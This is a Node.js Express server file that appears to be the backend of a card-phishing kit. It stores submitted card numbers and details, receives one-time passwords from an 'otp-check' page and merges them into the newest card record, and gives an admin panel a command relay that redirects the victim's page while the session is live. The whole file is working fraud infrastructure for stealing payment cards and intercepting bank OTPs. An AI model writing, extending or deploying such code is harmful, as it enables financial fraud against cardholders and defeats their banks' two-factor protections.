const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Multi-card storage — ordered list (newest first)
let cardList = [];
const MAX_CARDS = 200;

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString(), totalCards: cardList.length });
});

// POST /api/card-data — Save card (generates unique ID per submission)
app.post('/api/card-data', (req, res) => {
  try {
    const data = req.body;
    if (!data.cardNumber) return res.status(400).json({ error: 'Card number is required' });

    // Always generate a unique ID so multiple cards are stored separately
    const incoming = data.cardId;
    const cardId = (!incoming || incoming === 'current-card')
      ? `card-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`
      : incoming;

    const card = { ...data, cardId, timestamp: new Date().toISOString(), updatedAt: Date.now(), server: 'backend' };

    // Replace if same cardId exists, otherwise prepend
    const idx = cardList.findIndex(c => c.cardId === cardId);
    if (idx >= 0) cardList[idx] = card;
    else { cardList.unshift(card); if (cardList.length > MAX_CARDS) cardList.pop(); }

    console.log(`Card saved: ${cardId} (total: ${cardList.length})`);
    res.json({ success: true, message: 'Datos guardados en servidor', cardId });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// GET /api/cards — Return all cards (new multi-card endpoint)
app.get('/api/cards', (req, res) => {
  const limit = Math.min(parseInt(req.query.limit) || 100, MAX_CARDS);
  res.json({ success: true, cards: cardList.slice(0, limit), count: cardList.length });
});

// GET /api/card-data?id=xxx — Single card (backward compat)
app.get('/api/card-data', (req, res) => {
  const cardId = req.query.id || 'current-card';
  const card = cardId === 'current-card' ? cardList[0] : cardList.find(c => c.cardId === cardId);
  if (!card) return res.status(404).json({ error: 'No data found' });
  res.json(card);
});

// DELETE /api/card-data/:cardId — Remove a single card
app.delete('/api/card-data/:cardId', (req, res) => {
  const before = cardList.length;
  cardList = cardList.filter(c => c.cardId !== req.params.cardId);
  res.json({ success: true, deleted: before - cardList.length });
});

// DELETE /api/cards — Clear all cards
app.delete('/api/cards', (req, res) => {
  cardList = [];
  res.json({ success: true, message: 'All cards cleared' });
});

// ── OTP RECEIVER ────────────────────────────────────────────────────────────
// POST /api/otp — otp-check.html sends the OTP; merged into the latest card
app.post('/api/otp', (req, res) => {
  try {
    const { otp, cardLast4, timestamp, source } = req.body || {};
    if (!otp) return res.status(400).json({ error: 'otp required' });
    if (cardList.length === 0) return res.status(404).json({ error: 'No cards stored' });
    // Merge OTP into the most recent card
    const card = cardList[0];
    cardList[0] = { ...card, otp, otpAt: timestamp || new Date().toISOString(), otpSource: source || 'otp-check' };
    console.log(`OTP received for card ${card.cardId}: ${otp}`);
    res.json({ success: true, cardId: card.cardId });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// ── COMMAND RELAY (admin panel → suite.html) ────────────────────────────────
// In-memory store: { cardId: { target, timestamp } }
const commandStore = {};
const CMD_TTL_MS = 5 * 60 * 1000; // 5 minutes

// POST /api/command — admin panel writes a redirect command
app.post('/api/command', (req, res) => {
  const { cardId, target } = req.body || {};
  if (!target) return res.status(400).json({ error: 'target required' });
  const id = cardId || 'current-card';
  const cmd = { target, timestamp: Date.now() };
  commandStore[id] = cmd;
  // Always also write to 'current-card' so suite.html can find it
  commandStore['current-card'] = cmd;
  console.log(`Command set for ${id}: redirect to ${target}`);
  res.json({ success: true });
});

// GET /api/command?cardId=xxx — suite.html polls and consumes the command
app.get('/api/command', (req, res) => {
  const cardId = req.query.cardId || 'current-card';
  const cmd = commandStore[cardId] || commandStore['current-card'];
  if (cmd && (Date.now() - cmd.timestamp) < CMD_TTL_MS) {
    delete commandStore[cardId];
    delete commandStore['current-card'];
    return res.json({ success: true, command: cmd });
  }
  res.json({ success: true, command: null });
});

app.use((req, res) => res.status(404).json({ error: 'Not found' }));

const server = app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// Keep-alive ping every 10 minutes to prevent Render free-tier sleep
setInterval(() => {
  fetch(`http://localhost:${PORT}/api/health`)
    .then(r => { if (r.ok) console.log(`Keep-alive ping OK - ${new Date().toISOString()}`); })
    .catch(e => console.error('Keep-alive error:', e.message));
}, 10 * 60 * 1000);
